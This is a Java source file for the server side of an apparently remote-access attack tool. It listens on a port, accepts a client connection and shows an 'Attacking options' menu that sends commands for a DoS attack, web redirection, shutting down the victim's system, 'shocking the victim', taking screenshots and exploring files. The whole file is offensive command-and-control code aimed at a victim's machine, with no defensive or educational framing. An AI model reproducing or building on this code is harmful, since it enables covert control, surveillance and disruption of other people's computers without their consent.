import java.net.*;
import java.util.*;

import javax.swing.JFrame;
import javax.swing.JOptionPane;

import java.io.*;
public class Server {
	static int port = 25001;
	static ServerSocket ss;
	static Socket s;
	static DataInputStream din;
	static DataOutputStream dout;
	static BufferedReader br;
	static String send="",recive="";
	static Scanner in = new Scanner(System.in);
	AttackOperation ao = new AttackOperation();
	public void openConnection(){
		
		JFrame j=new JFrame();
		j.setAlwaysOnTop(true);
		j.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		j.setVisible(true);
		j.setVisible(false);
		
		try{
			ss = new ServerSocket(port);
			s = ss.accept();
			JOptionPane.showMessageDialog(j, "Connection established with client at port :"+port);
			
			int option=optionForAttacking(j);
			
			din = new DataInputStream(s.getInputStream());
			dout = new DataOutputStream(s.getOutputStream());
			br = new BufferedReader(new InputStreamReader(System.in));
			
			while(option<9){
				
				if(option == 1){
					dout.writeUTF("dos");
					recive = din.readUTF();
					JOptionPane.showMessageDialog(j, recive);
				}
				
				if(option== 2){
					ao.webAttack(j,din,dout);
				}
				
				if(option == 3){
					dout.writeUTF("shut");
					recive = din.readUTF();
					JOptionPane.showMessageDialog(j, recive);
				}
				
				if(option == 4){
					try{
						//chat 
						dout.writeUTF("chat");
						recive = din.readUTF();
						while(!send.equals("stop") || !recive.equals("stop")){
							String temp = "client :";
							temp+=recive;
							send = JOptionPane.showInputDialog(j,temp);
							dout.writeUTF(send);
							recive = din.readUTF();
							if(recive.equals("stop")){
								JOptionPane.showMessageDialog(j, "chat ended..");
								break;
							}
						}
						
						
					}
					catch (Exception e){

						
					}
				}
				
				if(option == 5){
					dout.writeUTF("shock");
					recive = din.readUTF();
					JOptionPane.showMessageDialog(j, recive);
				}
				
				if(option == 6){
					dout.writeUTF("light");
					recive = din.readUTF();
					JOptionPane.showMessageDialog(j, recive);
				}
				
				if(option == 7){
					send = ao.screenshot(j);
					dout.writeUTF(send);
					recive = din.readUTF();
					JOptionPane.showMessageDialog(j, recive);
					
				}
				if(option == 8){
					send = ao.fileExplore(j);
					dout.writeUTF(send);
					recive = din.readUTF();
					JOptionPane.showMessageDialog(j, recive);
					
				}
				

				
				option = optionForAttacking(j);
			}
			
			s.close();
			ss.close();
			
			JOptionPane.showMessageDialog(j, "SEE YOU !!");
			System.exit(0);

			
		}
		catch(Exception e){
			JOptionPane.showMessageDialog(j, "SEE YOU !!");
			System.exit(0);
		}
	}
	
	public static int optionForAttacking(JFrame j){
		int choise = 0;
		try{
			String option="";
			String options = "\nAttacking options:\n\n1: Dos Attack\n2: Web redirecting\n3: Shutdown the system\n4: chat with client\n5: Shock the victim\n6: Fun light script\n7: take screenshot\n8: file exploration\n\nEnter your choise:\n";
			option = JOptionPane.showInputDialog(j,options);
			choise= Integer.parseInt(option);
		}
		catch (Exception e){
			String ch = JOptionPane.showInputDialog(j, "You Entered the wrong option:\n\n1.main menu\n2.exit");
			if(ch.equals("1")) return optionForAttacking(j);
			else return 10;
			
		}
		return choise;
	}
	

	
	
	

}
